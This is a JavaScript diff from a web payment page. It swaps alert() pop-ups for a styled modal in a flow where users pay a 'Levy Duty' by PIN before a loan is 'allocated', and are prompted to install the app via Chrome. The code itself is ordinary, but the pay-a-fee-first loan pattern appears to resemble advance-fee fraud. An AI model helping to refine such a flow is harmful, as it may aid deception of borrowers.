                 showScreen('screen-success');
                 startPolling(txnId);
 
             } catch (err) {
-                console.error("Payment error:", err);
-                let displayMsg = err.message || (typeof err === 'string' ? err : JSON.stringify(err));
-                alert("Payment Error:\n\n" + displayMsg + "\n\nCheck the browser console for details.");
+                showModal("Payment Error", err.message, "warning");
                 document.getElementById('btn-pay').innerText = `Pay ${format(state.levy)} Levy Duty`;
                 document.getElementById('btn-pay').disabled = false;
             }
@@ -798,7 +821,7 @@
                 timeDisplay.innerText = (attempts * 2) + "s";
                 if (attempts > 45) {
                     clearInterval(pollTimer);
-                    alert("Timeout: If you entered your PIN, your loan will be allocated shortly.");
+                    showModal("Timeout", "If you entered your PIN, your loan will be allocated shortly. Check back later.", "info");
                     return;
                 }
                 try {
@@ -815,7 +838,7 @@
                     } else if (status === "FAILED" || status === "CANCELLED") {
                         clearInterval(pollTimer);
                         localStorage.removeItem('inflight_txn');
-                        alert("Payment failed or cancelled. Please try again.");
+                        showModal("Payment Failed", "Your payment was cancelled or declined. Please try again.", "warning");
                         showScreen('screen-payment');
                         document.getElementById('btn-pay').innerText = `Pay ${format(state.levy)} Levy Duty`;
                         document.getElementById('btn-pay').disabled = false;
@@ -847,7 +870,7 @@
         }
         function copyLink() {
             navigator.clipboard.writeText(window.location.href).then(() => {
-                alert("✅ Link copied! Now paste it in Google Chrome.");
+                showModal("Link Copied", "Paste the link in Google Chrome to install the app.", "success");
             }).catch(() => {
                 prompt("Copy this link and paste it in Chrome:", window.location.href);
             });
